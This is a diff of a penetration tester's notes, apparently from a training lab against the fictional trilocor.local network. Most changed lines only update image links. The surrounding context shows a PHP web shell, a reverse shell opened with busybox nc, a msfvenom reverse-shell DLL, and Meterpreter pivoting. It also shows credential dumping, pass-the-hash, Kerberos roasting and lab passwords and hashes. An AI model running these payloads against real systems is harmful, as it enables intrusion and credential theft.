@@ -3,11 +3,11 @@ aliases:
 ---
 ---
 
-![[Pasted image 20260120120213.png]]
+![image-center](/assets/images/Pasted image 20260120120213.png)
 
-![[Pasted image 20260120145448.png]]
+![image-center](/assets/images/Pasted image 20260120145448.png)
 
-![[Pasted image 20260120120356.png]]
+![image-center](/assets/images/Pasted image 20260120120356.png)
 
 ```bash
 nmap -sCV -p21,22,25,53,80,110,111,143,993,995 10.129.5.203 -oG ports_service_scan                                                              
@@ -95,7 +95,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 128.54 seconds
 ```
 
-![[Pasted image 20260120121024.png]]
+![image-center](/assets/images/Pasted image 20260120121024.png)
 
 ```bash
 dig axfr @10.129.5.203 trilocor.local
@@ -120,11 +120,11 @@ trilocor.local.         86400   IN      SOA     ns1.trilocor.local. dnsadmin.tri
 ;; XFR size: 11 records (messages 1, bytes 341)
 ```
 
-![[Pasted image 20260120121819.png]]
+![image-center](/assets/images/Pasted image 20260120121819.png)
 
 ## news.trilocor.local
 
-![[Pasted image 20260120121843.png]]
+![image-center](/assets/images/Pasted image 20260120121843.png)
 
 ```bash
 gobuster vhost -u http://trilocor.local -w /usr/share/seclists/Discovery/DNS/bitquark-sub
@@ -138,7 +138,7 @@ jobs.trilocor.localnms.trilocor.localhrportal.trilocor.local Status: 200 [Size: 
 *.trilocor.local Status: 400 [Size: 301]
 ```
 
-![[Pasted image 20260120122140.png]]
+![image-center](/assets/images/Pasted image 20260120122140.png)
 
 ```bash
 nmap -p 25 --script smtp-enum-users,smtp-open-relay,smtp-commands trilocor.local
@@ -157,38 +157,38 @@ Nmap done: 1 IP address (1 host up) scanned in 40.76 seconds
 ```
 ## hrportal.triilocor.local
 
-![[Pasted image 20260120122509.png]]
+![image-center](/assets/images/Pasted image 20260120122509.png)
 
 ## blog.trilocor.local
 
-![[Pasted image 20260120123631.png]]
+![image-center](/assets/images/Pasted image 20260120123631.png)
 
-![[Pasted image 20260120134703.png]]
+![image-center](/assets/images/Pasted image 20260120134703.png)
 
 
 ## nms.trilocor.local
 
-![[Pasted image 20260120124213.png]]
+![image-center](/assets/images/Pasted image 20260120124213.png)
 
 `admin:admin`
 
-![[Pasted image 20260120124311.png]]
+![image-center](/assets/images/Pasted image 20260120124311.png)
 
-![[Pasted image 20260120125026.png]]
+![image-center](/assets/images/Pasted image 20260120125026.png)
 
-![[Pasted image 20260120125214.png]]
+![image-center](/assets/images/Pasted image 20260120125214.png)
 
-![[Pasted image 20260120125200.png]]
+![image-center](/assets/images/Pasted image 20260120125200.png)
 
-![[Pasted image 20260120125933.png]]
+![image-center](/assets/images/Pasted image 20260120125933.png)
 
-![[Pasted image 20260120165338.png]]
+![image-center](/assets/images/Pasted image 20260120165338.png)
 
-![[Pasted image 20260120192147.png]]
+![image-center](/assets/images/Pasted image 20260120192147.png)
 
-![[Pasted image 20260120192414.png]]
+![image-center](/assets/images/Pasted image 20260120192414.png)
 
-![[Pasted image 20260120192833.png]]
+![image-center](/assets/images/Pasted image 20260120192833.png)
 
 ```bash
 nc -nlvp 3389                                              
@@ -196,34 +196,34 @@ listening on [any] 3389 ...
 connect to [10.10.16.63] from (UNKNOWN) [10.129.5.203] 34651
 ```
 
-![[Pasted image 20260120193700.png]]
+![image-center](/assets/images/Pasted image 20260120193700.png)
 
-![[Pasted image 20260120193535.png]]
+![image-center](/assets/images/Pasted image 20260120193535.png)
 
 
 ## selfservicestg.trilocor.local
 
-![[Pasted image 20260120130534.png]]
+![image-center](/assets/images/Pasted image 20260120130534.png)
 
-![[Pasted image 20260120130546.png]]
+![image-center](/assets/images/Pasted image 20260120130546.png)
 
-![[Pasted image 20260120143705.png]]
+![image-center](/assets/images/Pasted image 20260120143705.png)
 
-![[Pasted image 20260120143758.png]]
-
-
-![[Pasted image 20260120143744.png]]
-
-![[Pasted image 20260120144408.png]]
+![image-center](/assets/images/Pasted image 20260120143758.png)
 
 
-![[Pasted image 20260120144237.png]]
+![image-center](/assets/images/Pasted image 20260120143744.png)
 
-![[Pasted image 20260120145150.png]]
+![image-center](/assets/images/Pasted image 20260120144408.png)
 
-![[Pasted image 20260120145913.png]]
 
-![[Pasted image 20260120150758.png]]
+![image-center](/assets/images/Pasted image 20260120144237.png)
+
+![image-center](/assets/images/Pasted image 20260120145150.png)
+
+![image-center](/assets/images/Pasted image 20260120145913.png)
+
+![image-center](/assets/images/Pasted image 20260120150758.png)
 
 ```bash
 hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
@@ -267,19 +267,19 @@ Dictionary cache hit:
 Approaching final keyspace - workload adjusted.
 ```
 
-![[Pasted image 20260120151051.png]]
+![image-center](/assets/images/Pasted image 20260120151051.png)
 
-![[Pasted image 20260120155129.png]]
+![image-center](/assets/images/Pasted image 20260120155129.png)
 
-![[Pasted image 20260120161028.png]]
+![image-center](/assets/images/Pasted image 20260120161028.png)
 
-![[Pasted image 20260120195642.png]]
+![image-center](/assets/images/Pasted image 20260120195642.png)
 
-![[Pasted image 20260120195701.png]]
+![image-center](/assets/images/Pasted image 20260120195701.png)
 
-![[Pasted image 20260120203208.png]]
+![image-center](/assets/images/Pasted image 20260120203208.png)
 
-![[Pasted image 20260120203336.png]]
+![image-center](/assets/images/Pasted image 20260120203336.png)
 
 ```bash
 wget 10.10.16.63/index.html
@@ -396,19 +396,19 @@ msf post(multi/recon/local_exploit_suggester) > run
 [*] 172.18.0.13 - Meterpreter session 1 closed.  Reason: Died
 ```
 
-![[Pasted image 20260120213025.png]]
+![image-center](/assets/images/Pasted image 20260120213025.png)
 
-![[Pasted image 20260120213047.png]]
+![image-center](/assets/images/Pasted image 20260120213047.png)
 
-![[Pasted image 20260120213203.png]]
+![image-center](/assets/images/Pasted image 20260120213203.png)
 
-![[Pasted image 20260120213231.png]]
+![image-center](/assets/images/Pasted image 20260120213231.png)
 
-![[Pasted image 20260120213313.png]]
+![image-center](/assets/images/Pasted image 20260120213313.png)
 
-![[Pasted image 20260120213319.png]]
+![image-center](/assets/images/Pasted image 20260120213319.png)
 
-![[Pasted image 20260120213940.png]]
+![image-center](/assets/images/Pasted image 20260120213940.png)
 
 ```bash
 https://launchpad.net/ubuntu/noble/+package/cisco7crack
@@ -468,19 +468,19 @@ Encrypted string : 08116C5A0C15
 Plain string     : P@tel
 ```
 
-![[Pasted image 20260120231321.png]]
+![image-center](/assets/images/Pasted image 20260120231321.png)
 
 
-![[Pasted image 20260120231205.png]]
+![image-center](/assets/images/Pasted image 20260120231205.png)
 ## prototype-beta.trilocor.local
 
-![[Pasted image 20260120231423.png]]
+![image-center](/assets/images/Pasted image 20260120231423.png)
 
-![[Pasted image 20260120231447.png]]
+![image-center](/assets/images/Pasted image 20260120231447.png)
 
-![[Pasted image 20260120231559.png]]
+![image-center](/assets/images/Pasted image 20260120231559.png)
 
-![[Pasted image 20260120232943.png]]
+![image-center](/assets/images/Pasted image 20260120232943.png)
 
 ```bash
 gobuster dir -u http://prototype-beta.trilocor.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -x php -t 200 -q
@@ -494,13 +494,13 @@ server-status        (Status: 403) [Size: 294]
 ```
 
 
-![[Pasted image 20260120233525.png]]
+![image-center](/assets/images/Pasted image 20260120233525.png)
 
-![[Pasted image 20260120234016.png]]
+![image-center](/assets/images/Pasted image 20260120234016.png)
 
-![[Pasted image 20260121000838.png]]
+![image-center](/assets/images/Pasted image 20260121000838.png)
 
-![[Pasted image 20260121002347.png]]
+![image-center](/assets/images/Pasted image 20260121002347.png)
 
 ```php
 echo "PD9waHAKCi8vIHJlZGlyZWN0IG9uIGRpcmVjdCBhY2Nlc3MKaWYgKF9fRklMRV9fID09PSByZWFscGF0aCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pKSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiBpbmRleC5waHA/cGFnZT1hcHBseS5waHAnKTsKfQoKc2Vzc2lvbl9zdGFydCgpOwoKJGNvZGVfZm9ybSA9ICcKPGNlbnRlcj4KPGgxPlBsZWFzZSBlbnRlciB5b3VyIGludml0ZSBjb2RlPC9oMT48YnI+CiAgICA8Zm9ybSBzdHlsZT0id2lkdGg6IDUwJSI+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvZGUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJpbnZpdGUtY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgY29kZSI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGFnZSIgdmFsdWU9ImFwcGx5LnBocCIgLz4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U3VibWl0PC9idXR0b24+CiAgICA8L2Zvcm0+CjwvY2VudGVyPgonOwoKJHN1Ym1pc3Npb25fZm9ybSA9ICcKPGNlbnRlcj4KPGgxPlBsZWFzZSBlbnRlciB5b3VyIGRldGFpbHM8L2gxPjxicj4KICAgIDxmb3JtIHN0eWxlPSJ3aWR0aDogNTAlIiBpZD0ic3VibWlzc2lvbkZvcm0iPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iaW5wdXQtbmFtZSIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgZnVsbCBuYW1lIiBmb3JtPSJzdWJtaXNzaW9uRm9ybSIgcmVxdWlyZWQ+CiAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iaW5wdXQtZW1haWwiIHBsYWNlaG9sZGVyPSJFbnRlciB5b3VyIGVtYWlsIiBmb3JtPSJzdWJtaXNzaW9uRm9ybSIgcmVxdWlyZWQ+CiAgICAgICAgPGZvcm0gYWN0aW9uPSJ1cGxvYWQucGhwIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGlkPSJ1cGxvYWRGb3JtIj4KICAgICAgICAgICAgPHA+UGxlYXNlIGNsaWNrIG9uIHRoZSBpbWFnZSBiZWxvdyB0byB1cGxvYWQgYW4gaW1hZ2Ugb2YgeW91ciBzdWJtaXNzaW9uPC9wPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkRmlsZSIgaWQ9InVwbG9hZEZpbGUiIG9uY2hhbmdlPSJjaGVja0ZpbGUodGhpcykiIGFjY2VwdD0iLmpwZywuanBlZywucG5nLC5naWYiIGZvcm09InVwbG9hZEZvcm0iPgogICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlcy9kZWZhdWx0LmpwZyIgY2xhc3M9InVwbG9hZC1pbWFnZSIgaWQ9InVwbG9hZC1pbWFnZSIgZm9ybT0idXBsb2FkRm9ybSI+CiAgICAgICAgICAgIDxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIiBpZD0ic3VibWl0LXVwbG9hZCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgZm9ybT0idXBsb2FkRm9ybSIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IGdyZWVuOyBib3JkZXItY29sb3I6IGdyZWVuOyI+CiAgICAgICAgICAgIDxwIGlkPSJlcnJvcl9tZXNzYWdlIj48L3A+CiAgICAgICAgPC9mb3JtPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhZ2UiIHZhbHVlPSJhcHBseS5waHAiIGZvcm09InN1Ym1pc3Npb25Gb3JtIi8+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iMSIgZm9ybT0ic3VibWlzc2lvbkZvcm0iLz4KICAgICAgICA8YnI+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGlkPSJzdWJtaXQtZm9ybSIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgZm9ybT0ic3VibWlzc2lvbkZvcm0iIGRpc2FibGVkPlNlbmQgWW91ciBTdWJtaXNzaW9uPC9idXR0b24+CiAgICA8L2Zvcm0+CjwvY2VudGVyPgonOwoKaWYgKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZCJdKSB8fCAkX1NFU1NJT05bImxvZ2dlZCJdICE9PSB0cnVlKSB7CiAgICBpZiAoIWlzc2V0KCRfR0VUWyJjb2RlIl0pKSB7CiAgICAgICAgZWNobyAkY29kZV9mb3JtOwogICAgfQogICAgLy8gdmFsaWRhdGUgaW52aXRlIGNvZGUKICAgIGVsc2UgaWYgKGlzc2V0KCRfR0VUWydjb2RlJ10pICYmIHByZWdfbWF0Y2goJy9edHJpbF9bMC05QS1aYS16XXs0fV9bMC05QS1aYS16XXs0fV9bMC05QS1aYS16XXs0fV8yMFswLTldezJ9JC9pJywgJF9HRVRbJ2NvZGUnXSkpIHsKICAgICAgICAkX1NFU1NJT05bImxvZ2dlZCJdID0gdHJ1ZTsKICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBhcHBseS5waHAnKTsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAkY29kZV9mb3JtOwogICAgICAgIGVjaG8gJzxjZW50ZXI+PHAgc3R5bGU9ImNvbG9yOiByZWQiPkludmFsaWQgY29kZSE8L3A+PC9jZW50ZXI+JzsKICAgIH0KfSBlbHNlIHsKICAgIGlmIChpc3NldCgkX0dFVFsnc3VibWl0J10pKSB7CiAgICAgICAgZWNobyAnPGNlbnRlcj48cD5Zb3VyIHN1Ym1pc3Npb24gaGFzIGJlZW4gc3VibWl0dGVkIHN1Y2Nlc3NmdWxseSE8L3A+PC9jZW50ZXI+JzsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAkc3VibWlzc2lvbl9mb3JtOwogICAgfQp9" | base64 -d
@@ -565,16 +565,16 @@ if (!isset($_SESSION["logged"]) || $_SESSION["logged"] !== true) {
 }
 ```
 
-![[Pasted image 20260121001905.png]]
+![image-center](/assets/images/Pasted image 20260121001905.png)
 
-![[Pasted image 20260121002006.png]]
+![image-center](/assets/images/Pasted image 20260121002006.png)
 
 ```bash
 cat exploit.phtml.png 
 <?php system($_GET['cmd']); ?>
 ```
 
-![[Pasted image 20260121030014.png]]
+![image-center](/assets/images/Pasted image 20260121030014.png)
 
 ```bash
 http://prototype-beta.trilocor.local/index.php?page=./user_submissions/exploit.phtml.png&cmd=busybox%20nc%2010.10.16.63%204444%20-e%20%2Fbin%2Fbash
@@ -594,7 +594,7 @@ cat flag.txt
 b7098545f2d1bd68ece2b175919f86d0
 ```
 
-![[Pasted image 20260121030350.png]]
+![image-center](/assets/images/Pasted image 20260121030350.png)
 
 ```bash
 websvc@WEB-DMZ01:/home/websvc$ cat /etc/passwd
@@ -698,9 +698,9 @@ linpeas.sh          100%[===================>] 952.58K   642KB/s    in 1.5s
 2026-01-21 15:03:04 (642 KB/s) - 'linpeas.sh' saved [975444/975444]
 ```
 
-![[Pasted image 20260121120327.png]]
+![image-center](/assets/images/Pasted image 20260121120327.png)
 
-![[Pasted image 20260121120602.png]]
+![image-center](/assets/images/Pasted image 20260121120602.png)
 
 ```bash
 websvc@WEB-DMZ01:/tmp/pkwner$ cat /var/lib/fwupd/pki/secret.key
@@ -753,7 +753,7 @@ websvc@WEB-DMZ01:/$ hostname -I
 64 bytes from 172.16.139.35: icmp_seq=1 ttl=128 time=4.36 ms
 ```
 
-![[Pasted image 20260122125356.png]]
+![image-center](/assets/images/Pasted image 20260122125356.png)
 
 ```bash
 websvc@WEB-DMZ01:~$ nc localhost 2121
@@ -912,12 +912,12 @@ tcp6       0      0 :::443                  :::*                    LISTEN      
 tcp6       0      0 :::4444                 :::*  
 ```
 
-![[Pasted image 20260122142127.png]]
+![image-center](/assets/images/Pasted image 20260122142127.png)
 
 
 https://aaronesau.com/blog/post/6
 
-![[Pasted image 20260122144426.png]]
+![image-center](/assets/images/Pasted image 20260122144426.png)
 
 ```bash
 nc localhost 2121
@@ -978,9 +978,9 @@ Pu8VhogsJI8bGgSxKHwyRgZeG/Yrr8YXzSUxbHskE6ddlWbc3T2Qfa1opoMrjinWShHG5j
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-![[Pasted image 20260122144444.png]]
+![image-center](/assets/images/Pasted image 20260122144444.png)
 
-![[Pasted image 20260122125538.png]]
+![image-center](/assets/images/Pasted image 20260122125538.png)
 
 ```bash
 srvadm@WEB-DMZ01:~$ sudo -l
@@ -993,7 +993,7 @@ User srvadm may run the following commands on WEB-DMZ01:
 
 https://gtfobins.org/gtfobins/csvtool/#shell
 
-![[Pasted image 20260122130013.png]]
+![image-center](/assets/images/Pasted image 20260122130013.png)
 
 ```bash
 srvadm@WEB-DMZ01:~$ sudo /usr/bin/csvtool call '/bin/sh;false' /etc/hosts
@@ -1006,7 +1006,7 @@ root@WEB-DMZ01:~# cat flag.txt
 1f99751e8c37dfd03ca249f97b2b588c
 ```
 
-![[Pasted image 20260122125959.png]]
+![image-center](/assets/images/Pasted image 20260122125959.png)
 
 ```bash
 #!/bin/bash
@@ -1149,15 +1149,15 @@ jdbc.default.url=jdbc:postgresql://localhost:5432/lportal
 jdbc.default.username=admin
 ```
 
-![[Pasted image 20260121154657.png]]
+![image-center](/assets/images/Pasted image 20260121154657.png)
 
-![[Pasted image 20260121154819.png]]
+![image-center](/assets/images/Pasted image 20260121154819.png)
 
-![[Pasted image 20260121160202.png]]
+![image-center](/assets/images/Pasted image 20260121160202.png)
 
-![[Pasted image 20260121160430.png]]
+![image-center](/assets/images/Pasted image 20260121160430.png)
 
-![[Pasted image 20260121170633.png]]
+![image-center](/assets/images/Pasted image 20260121170633.png)
 
 ```bash
  Volume Serial Number is DF59-CC7D
@@ -1211,7 +1211,7 @@ Administrator            DefaultAccount           Guest
 rhinkle                  svc_liferay              WDAGUtilityAccount  
 ```
 
-![[Pasted image 20260121220507.png]]
+![image-center](/assets/images/Pasted image 20260121220507.png)
 
 ```bash
 hice esto:
@@ -1259,7 +1259,7 @@ new File(outputPath).write(scriptLimpio, "UTF-8")
 println "Archivo guardado sin espacios en: " + outputPath
 ```
 
-![[Pasted image 20260121222046.png]]
+![image-center](/assets/images/Pasted image 20260121222046.png)
 
 shell.jsp
 ```bash
@@ -1322,7 +1322,7 @@ println "[+] EXE binario guardado correctamente en: " + outputPath
 println "[+] Tamaño esperado: " + decodedBytes.length + " bytes"
 ```
 
-![[Pasted image 20260122142540.png]]
+![image-center](/assets/images/Pasted image 20260122142540.png)
 
 shell system en srv01
 
@@ -1376,7 +1376,7 @@ C:\Windows\System32\OpenSSH\;C:\Users\svc_liferay\AppData\Local\Microsoft\Window
 
 ```
 
-![[Pasted image 20260122150221.png]]
+![image-center](/assets/images/Pasted image 20260122150221.png)
  genero dll
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=172.16.139.10 LPORT=4444 -f dll > srrstr.dll
@@ -1432,7 +1432,7 @@ SeCreateGlobalPrivilege       Create global objects               Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
 ```
 
-![[Pasted image 20260122150742.png]]
+![image-center](/assets/images/Pasted image 20260122150742.png)
 
 ```powershell
 C:\ProgramData>tasklist /svc | findstr "rundll32"
@@ -1719,7 +1719,7 @@ meterpreter > upload TcbElevation.exe C:\\programdata\\TcbElevation.exe
 [*] Completed  : /home/zs1n/Desktop/CPTS/TcbElevation.exe -> C:\programdata\TcbElevation.exe
 ```
 
-![[Pasted image 20260122172555.png]]
+![image-center](/assets/images/Pasted image 20260122172555.png)
 
 ```powershell
 PS C:\ProgramData> .\TcbElevation.exe
@@ -1742,7 +1742,7 @@ whoami
 nt authority\system
 ```
 
-![[Pasted image 20260122172448.png]]
+![image-center](/assets/images/Pasted image 20260122172448.png)
 
 ```powershell
 C:\Users\Administrator\Desktop>type flag.txt
@@ -1786,7 +1786,7 @@ meterpreter > download sam.bak
 [*] Completed  : sam.bak -> /home/zs1n/Desktop/CPTS/sam.bak
 ```
 
-![[Pasted image 20260122185747.png]]
+![image-center](/assets/images/Pasted image 20260122185747.png)
 
 
 ```bash
@@ -1822,9 +1822,9 @@ NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791
 [*] Cleaning up...
 ```
 
-![[Pasted image 20260122185855.png]]
+![image-center](/assets/images/Pasted image 20260122185855.png)
 
-![[Pasted image 20260122200831.png]]
+![image-center](/assets/images/Pasted image 20260122200831.png)
 
 ```bash
 proxychains nxc smb 172.16.139.35 --local-auth -u Administrator -H '9cc7e0d2bcd1b87a2823ec664a661113' 
@@ -1869,12 +1869,12 @@ SMB         172.16.139.35   445    SRV01            svc_liferay:RnD0mPAssw0rdSup
 SMB         172.16.139.35   445    SRV01            [+] Dumped 8 LSA secrets to /root/.nxc/logs/lsa/SRV01_172.16.139.35_2026-01-22_180823.secrets and /root/.nxc/logs/lsa/SRV01_172.16.139.35_2026-01-22_180823.cached
 ```
 
-![[Pasted image 20260122201142.png]]
+![image-center](/assets/images/Pasted image 20260122201142.png)
 
 
-![[Pasted image 20260122192201.png]]
+![image-center](/assets/images/Pasted image 20260122192201.png)
 
-![[Pasted image 20260122194046.png]]
+![image-center](/assets/images/Pasted image 20260122194046.png)
 
 
 ```powershell
@@ -1982,7 +1982,7 @@ Mode                LastWriteTime         Length Name
                                         "contents": "- Move all development activities to WKS01 VDI. Infra set up a shared login (Keep amongst the project team)\n\tHost: 172.16.139.175\n\tUsername: devuser_1\n\tPassword: Changemeplz123!\"\n\n- Move to 1Password once deployed company-wide\n- Set AxCrypt-2 default to AES-256",
 ```
 
-![[Pasted image 20260122203434.png]]
+![image-center](/assets/images/Pasted image 20260122203434.png)
 
 ```bash
 msf post(multi/manage/autoroute) > set session 1
@@ -2013,11 +2013,11 @@ meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.139.175
 
 ```
 
-![[Pasted image 20260123122155.png]]
+![image-center](/assets/images/Pasted image 20260123122155.png)
 
-![[Pasted image 20260123122314.png]]
+![image-center](/assets/images/Pasted image 20260123122314.png)
 
-![[Pasted image 20260123134529.png]]
+![image-center](/assets/images/Pasted image 20260123134529.png)
 
 ```powershell
 PS C:\ProgramData> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
@@ -2052,9 +2052,9 @@ PS C:\ProgramData>
 
 https://www.exploit-db.com/exploits/50047
 
-![[Pasted image 20260123134353.png]]
+![image-center](/assets/images/Pasted image 20260123134353.png)
 
-![[Pasted image 20260123134645.png]]
+![image-center](/assets/images/Pasted image 20260123134645.png)
 
 ```cmd
 Microsoft Windows [Version 10.0.19045.5487]
@@ -2063,16 +2063,16 @@ C:\Windows>whoami
 nt authority\system                                                                                         
 ```
 
-![[Pasted image 20260123134818.png]]
+![image-center](/assets/images/Pasted image 20260123134818.png)
 
 ```cmd
 PS C:\Users\Administrator\Desktop> type .\flag.txt
 e6b69ce6f8c9d3c43dfbfb6757fa166b
 ```
 
-![[Pasted image 20260123135222.png]]
+![image-center](/assets/images/Pasted image 20260123135222.png)
 
-![[Pasted image 20260123140023.png]]
+![image-center](/assets/images/Pasted image 20260123140023.png)
 
 ```cmd
 C:\Users\devuser_1\Documents>reg save HKLM\SAM samm.bak
@@ -2086,7 +2086,7 @@ The operation completed successfully.
 ```
 
 
-![[Pasted image 20260123140008.png]]
+![image-center](/assets/images/Pasted image 20260123140008.png)
 
 ```bash
 impacket-secretsdump -sam samm.bak -system system.bak -security security.bak LOCAL
@@ -2214,7 +2214,7 @@ Password: -PL<mko09ijn!
 Login: bvincent@ad.trilocor.local
 ```
 
-![[Pasted image 20260123140727.png]]
+![image-center](/assets/images/Pasted image 20260123140727.png)
 
 ```bash
 PS C:\Users\devuser_1\Documents> .\SharpHound.exe -c all
@@ -2243,7 +2243,7 @@ Closing writers
 2026-01-23T10:05:49.3737931-08:00|INFORMATION|SharpHound Enumeration Completed at 10:05 AM on 1/23/2026! Happy Graphing!
 ```
 
-![[Pasted image 20260123140822.png]]
+![image-center](/assets/images/Pasted image 20260123140822.png)
 
 passspray
 
@@ -2271,7 +2271,7 @@ Version: v1.0.3 (9dad6e1) - 01/23/26 - Ronnie Flathers @ropnop
 
 ```
 
-![[Pasted image 20260123142403.png]]
+![image-center](/assets/images/Pasted image 20260123142403.png)
 
 
 ```bash
@@ -2323,7 +2323,7 @@ SMB         172.16.139.3    445    DC01             Users           READ        
 SMB         172.16.139.3    445    DC01             ZZZ_archive                     Archives
 ```
 
-![[Pasted image 20260123142841.png]]
+![image-center](/assets/images/Pasted image 20260123142841.png)
 
 bloodhoun-cliu
 
@@ -2368,7 +2368,7 @@ VERBOSE: [Get-DomainUser] Searching for non-null service principal names
 VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
 ```
 
-![[Pasted image 20260123150304.png]]
+![image-center](/assets/images/Pasted image 20260123150304.png)
 
 ```bash
 hashcat -m 13100 hashessss /usr/share/wordlists/rockyou.txt   
@@ -2412,7 +2412,7 @@ PS C:\Users\devuser_1\Documents> .\Rubeus.exe asreproast /nowrap
       $krb5asrep$jwegman@ad.trilocor.local:23CEBD52E4B192B49B7DACA9905B117C$DF7830B179E6612787111418F786DFDB630DDD420F07096D8C3A58E2C85622734D76FE8F44F8DF9A5F639974EA5C860ED5EB826D44E8C2B177D47467A0B957FAB9C1A96B5042651EC34AD446420DA5573B1CC75BFD15F8CD4FDB1F6970281F64E42D99902FA5A6B52DC12D524EF063C684EA22AE9D2CB0E61C4D42EAFD8F88A99C3EF58EA85AAA8675040BEB7E2B76826905569139D7CE7BE74479EE4BA1B570F8E669FC75AFCECDC9D921224EF6CAB5D27DB7EE8D99DC6284D05E2B4278E7E27AEFEC3346F2D9EEB9FC9554F346969F49EAC6FFA9283D798E790BD43D0ED6673BF907D6BF009F10B579BBB04B7BAB2499DF742A2E35
 ```
 
-![[Pasted image 20260123215759.png]]
+![image-center](/assets/images/Pasted image 20260123215759.png)
 
 ```bash
 john hash_jwegman -w=/usr/share/wordlists/rockyou.txt               
@@ -2459,7 +2459,7 @@ $logFile = "\\server\folder\log.txt"
 
 ```
 
-![[Pasted image 20260124131234.png]]
+![image-center](/assets/images/Pasted image 20260124131234.png)
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u phernandez -p 'bLink182' --dc-ip 172.16.139.3 set password ghiggins 'Lalahola23!$'
 [proxychains] config file found: /etc/proxychains4.conf
@@ -2468,10 +2468,10 @@ proxychains bloodyAD -d ad.trilocor.local -u phernandez -p 'bLink182' --dc-ip 17
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] Password changed successfully!
 ```
-![[Pasted image 20260124131219.png]]
+![image-center](/assets/images/Pasted image 20260124131219.png)
 
 
-![[Pasted image 20260124131319.png]]
+![image-center](/assets/images/Pasted image 20260124131319.png)
 ```bash
 proxychains bloodyAD -d ad.trilocor.local -u ghiggins -p 'Lalahola23!$' --dc-ip 172.16.139.3 add groupMember 'Contractors' ghiggins
 [proxychains] config file found: /etc/proxychains4.conf
@@ -2480,9 +2480,9 @@ proxychains bloodyAD -d ad.trilocor.local -u ghiggins -p 'Lalahola23!$' --dc-ip 
 [proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
 [+] ghiggins added to Contractors
 ```
-![[Pasted image 20260124131533.png]]
+![image-center](/assets/images/Pasted image 20260124131533.png)
 
-![[Pasted image 20260124131557.png]]
+![image-center](/assets/images/Pasted image 20260124131557.png)
 
 ```bash
 ┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
@@ -2507,7 +2507,7 @@ proxychains bloodyAD -d ad.trilocor.local -u ghiggins -p 'Lalahola23!$' --dc-ip 
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
-![[Pasted image 20260124132212.png]]
+![image-center](/assets/images/Pasted image 20260124132212.png)
 
 shell ghiggins
 
@@ -2525,10 +2525,10 @@ No output received from the process.
 
 ```
 
-![[Pasted image 20260124155850.png]]
+![image-center](/assets/images/Pasted image 20260124155850.png)
 
 
-![[Pasted image 20260124155829.png]]
+![image-center](/assets/images/Pasted image 20260124155829.png)
 
 ```powershell
 PS C:\ProgramData> Set-DomainObject -Identity divanov -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
@@ -2544,7 +2544,7 @@ $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
